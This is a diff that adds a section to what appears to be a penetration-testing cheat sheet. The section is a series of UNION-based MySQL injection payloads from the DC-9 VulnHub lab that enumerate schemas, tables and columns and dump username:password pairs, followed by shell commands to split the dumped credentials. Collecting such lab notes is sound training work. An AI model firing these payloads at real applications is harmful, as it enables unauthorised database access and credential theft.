@@ -62,6 +62,35 @@ tom' OR 1=1 -- //
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
 
+
+### Example from DC-9 on PG
+https://grumpygeekwrites.wordpress.com/2021/06/06/dc-9-vulnhub-walk-through-tutorial-writeup/
+```
+- mary' and 1=1 #
+- mary' order by 1 #
+- mary' order by 6 #
+- mary' order by 7 #
+- mary' union select version(),user(),database(),4,5,6 #
+- mary' union select 1,group_concat(schema_name),3,4,5,6 from information_schema.schemata #
+- mary' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database() #
+- mary' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='Users' #
+- mary' union select group_concat(Username,":",Password),2,3,4,5,6 from Users #
+
+- mary' union SELECT concat(schema_name),2,3,4,5,6 FROM information_schema.schemata -- ;
+- mary' union SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='Staff' -- ;
+- mary' union SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='users' -- ;
+- mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'StaffDetails' -- ;
+- mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'Users' -- ;
+- mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'UserDetails' -- ;
+- mary' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;
+
+- cat userPass | tr "," "\n"
+- `cut -d ":" -f1 userPass2`  
+- `cut -d ":" -f2 userPass2`
+- mary' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- ;
+```
+
+
 ### MSSQL
 
 #### Authenticated SQLi
